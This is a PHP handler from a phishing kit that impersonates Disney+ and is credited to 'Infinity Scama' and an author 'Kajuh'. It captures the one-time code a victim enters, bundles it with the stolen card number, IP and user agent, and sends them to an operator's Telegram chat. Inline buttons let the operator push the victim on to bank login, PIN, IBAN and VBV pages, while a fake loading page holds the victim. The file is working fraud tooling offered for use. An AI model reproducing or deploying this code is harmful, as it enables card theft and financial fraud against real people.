<?php
session_start();
include('../../../common/subb_includes.php');
include('../../../config.php');
include('../../../app/1.php');
include('../../../app/2.php');
include('../../traduction.php');

// Set Telegram webhook
file_get_contents("https://api.telegram.org/bot{$telegram['token']}/setWebhook?url=https://{$_SERVER['HTTP_HOST']}/app/webhook.php");

// POST handling
if ($_POST) {

    if (!empty($_POST['code'])) {

        $_SESSION['code'] = htmlspecialchars($_POST['code']);

        $text = "
<b>🕹️ +1 OTP</b>

<b>🕹️ Code ➟</b> <code>{$_SESSION['code']}</code>
<b>💳 Carte ➟</b> <code>{$_SESSION['number']}</code>

<b>🌐 Ip Adress ➟</b> <code>{$_SESSION['ip']}</code>
<b>🌐 User Agent ➟</b> <code>{$_SESSION['ua']}</code>

<blockquote><b>Powered By ♾️ Infinity Scama ® - @InfinityScama
♾️ Scama : DISNEY+
♾️ Author : Kajuh - @KajuhDev</b></blockquote>";

        // Boutons Telegram
        if ($telegram['status'] == true) {
            $buttons = array(
                'inline_keyboard' => array(
                    array(
                        array('text' => '🗑️ BAN IP 🗑️', 'callback_data' => "ban={$_SESSION['ip']}"),
                        array('text' => '📊 STATS 📊', 'url' => "https://{$_SERVER['HTTP_HOST']}/panel/"),
                    ),
                    array(
                        array('text' => '🍎 OTP 🍎', 'callback_data' => "otp={$_SESSION['ip']}"),
                        array('text' => '📧 MAIL 📧', 'callback_data' => "mail={$_SESSION['ip']}"),
                        array('text' => '📱 SMS 📱', 'callback_data' => "sms={$_SESSION['ip']}"),
                    ),
                    array(
                        array('text' => '🏦 LOG 🏦', 'callback_data' => "bank={$_SESSION['ip']}"),
                        array('text' => '🚪FIN 🚪', 'callback_data' => "fin={$_SESSION['ip']}"),
                        array('text' => '💳 PIN 💳', 'callback_data' => "pin={$_SESSION['ip']}"),
                    ),
                    array(
                        array('text' => '🏛 IBAN 🏛', 'callback_data' => "iban={$_SESSION['ip']}"),
                        array('text' => '📲 VBV 📲', 'callback_data' => "vbv={$_SESSION['ip']}"),
                    ),
                    array(
                        array('text' => '❌ CODE INVALIDE ❌', 'callback_data' => "otperror={$_SESSION['ip']}"),
                    ),
                ),
            );
            sendMessage($telegram['RezChatId']['card'], $text, $buttons);
        }

        $_SESSION['otp-error'] = "";
        $_SESSION['previous-page'] = "";

        // Sauvegarde session avant redirection
        session_write_close();

        // Redirection via HTML/JS pour laisser le temps aux boutons Telegram de fonctionner
        $redirect = !empty($_SESSION['id5']) ? "../../" . rawurlencode($_SESSION['id5']) . "/" : "../";
        echo "<!DOCTYPE html>
<html lang='fr'>
<head>
<meta charset='UTF-8'>
<title>Redirection...</title>
<script type='text/javascript'>
    setTimeout(function(){
        window.location.href = '$redirect';
    }, 8000); // 8s délai pour assurer le traitement Telegram
</script>
</head>
<body>
<p>Loading, please wait...</p>
</body>
</html>";
        exit();

    } else {
        $_SESSION['otp-error'] = $errors['2'];
        header('Location: ../');
        exit();
    }

} else {
    $_SESSION['otp-error'] = $errors['1'];
    header('Location: ../../../index.html');
    exit();
}
